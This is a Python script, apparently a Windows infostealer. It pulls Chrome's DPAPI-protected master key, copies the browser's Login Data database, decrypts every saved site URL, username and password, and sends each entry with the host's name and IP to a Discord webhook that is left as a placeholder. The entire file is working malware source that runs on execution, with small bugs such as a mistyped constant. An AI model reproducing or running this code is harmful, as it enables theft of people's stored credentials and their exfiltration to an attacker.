from multiprocessing.sharedctypes import Value
import os
import json
import base64
import sqlite3
from tkinter import NS
from urllib.error import URLError
import webbrowser
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime
import PySimpleGUI as sg
import re
from urllib.request import Request, urlopen
import time
import requests
import socket
import discord
from discord import Webhook, RequestsWebhookAdapter, Embed 

Webhook_URL = "Webhook Here"

hostname=socket.gethostname()   
IP=socket.gethostbyname(hostname) 

passwords77 = []

FN = 116444736000000000
NC = 10000000


def ConvertDate(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - FN) / NS)
    return utc.strftime('%Y-%m-%d %H:%M:%S')


def get_master_key():
    try:
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State',
              "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    except:
        sg.popup("Error","Chrome Not Installed")
        exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def get_password():
    master_key = get_master_key()
    login_db = os.environ[
                   'USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")
    except:
        print("[*] Brave Browser Not Installed !!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                hack = ("URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 10 + "\n")
                webhook = Webhook.from_url(Webhook_URL, adapter=RequestsWebhookAdapter()) 
                embed = discord.Embed(title="신상들 어서오고~", description="👋") 
                embed.add_field(name=hostname, value=IP)
                embed.add_field(name="계정 신상", value=hack)
                webhook.send(embed=embed)
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass

get_password()

